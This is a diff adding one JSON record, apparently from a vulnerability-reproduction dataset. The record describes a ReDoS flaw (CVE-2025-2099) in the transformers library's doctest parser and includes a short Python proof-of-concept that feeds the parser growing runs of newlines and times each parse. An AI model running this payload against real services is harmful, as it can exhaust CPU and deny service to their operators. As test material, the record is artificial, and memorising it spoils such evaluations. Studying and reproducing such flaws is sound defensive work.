@@ -1,0 +1,15 @@
+{
+  "file_id": "220_transformers_huntr_97b780f3-ffca-424f-ad5d-0e1c57a5bde4",
+  "numeric_id": "220",
+  "library_hint": "transformers",
+  "source": "huntr",
+  "title": "Inefficient regular expression complexity in preprocess_string() function due to nested quantifiers causing ReDoS",
+  "cve": "CVE-2025-2099",
+  "cwe": "CWE-1333: Inefficient Regular Expression Complexity",
+  "library": "transformers",
+  "affected_version": ">= 4.48.3",
+  "vulnerable_function": "preprocess_string",
+  "triggerability": "indirect",
+  "trigger_payload": "import re\nimport time\nimport doctest\nfrom transformers.testing_utils import HfDocTestParser\nparser = HfDocTestParser()\nfor i in range(1, 50):\n    payload = \"```py\\n>>> \" + (\"\\n\" * i)\n    start = time.time()\n    parsed = parser.parse(payload)\n    end = time.time()\n    print(f\"Execution time: {end - start:.6f} s , iteration (i={i})\")",
+  "oracle": "Exponential increase in processing time of the parse function, leading to high CPU usage and potential denial of service"
+}
